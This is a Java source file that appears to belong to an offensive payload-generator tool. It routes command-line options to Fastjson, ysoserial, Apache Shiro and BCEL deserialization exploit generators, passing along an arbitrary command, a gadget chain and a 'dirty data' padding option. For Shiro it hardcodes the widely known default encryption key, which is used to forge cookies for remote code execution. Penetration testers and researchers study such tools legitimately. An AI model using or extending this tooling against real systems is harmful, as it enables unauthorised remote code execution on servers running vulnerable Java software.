package com.ding0x0.run;

import com.ding0x0.AbsGenerate;
import com.ding0x0.Payload;
import com.ding0x0.fastjson.GenerateFastjsonPayload;
import com.ding0x0.other.GenerateBCELPayload;
import com.ding0x0.other.GenerateShiroPayload;
import com.ding0x0.yso.GenerateYsoPayload;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.Option;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.Queue;

public class Process {

    public CommandLine cmdline;
    //有序添加编码方式
    public Queue<String> code;

    //其他参数
    public ArrayList<String> other;

    //gadget
    public String gadget;

    //payload 类型
    public String payloadType;

    //payload参数
    public ArrayList<String> payloadParam;

    public Process(Queue<String> code, ArrayList<String> other, String gadget, String payloadType, ArrayList<String> payloadParam, CommandLine cmdline){
        this.code = code;
        this.other = other;
        this.gadget = gadget;
        this.payloadParam = payloadParam;
        this.payloadType = payloadType;
        this.cmdline = cmdline;
    }

    public Object makeObject() throws Exception{
        String type = this.cmdline.getOptionValue(this.payloadType);
        String cmd;
        AbsGenerate generate = null;
        try {
            cmd = this.cmdline.getOptionValue("c");
        }catch (IndexOutOfBoundsException e){
            cmd = "sb";
        }
        String dirty = this.cmdline.getOptionValue("d");
        switch (this.payloadType){
            case "fastjson":
                generate = new GenerateFastjsonPayload(this.payloadParam, type);
                break;
            case "yso":
                generate = new GenerateYsoPayload(type, cmd, dirty);
                break;
            case "shiro":
                String key = this.cmdline.getOptionValue("k", "kPH+bIxk5D2deZiIxcaaaA==");
                String gadget = this.cmdline.getOptionValue("g");
                generate = new GenerateShiroPayload(gadget, key, cmd, dirty);
                break;
            case "bcel":
                String lf = this.cmdline.getOptionValue("lf");
                generate = new GenerateBCELPayload(lf);
        }

        return generate.generatePayload();
    }

    public static void main(String[] args) throws Exception {

    }
}
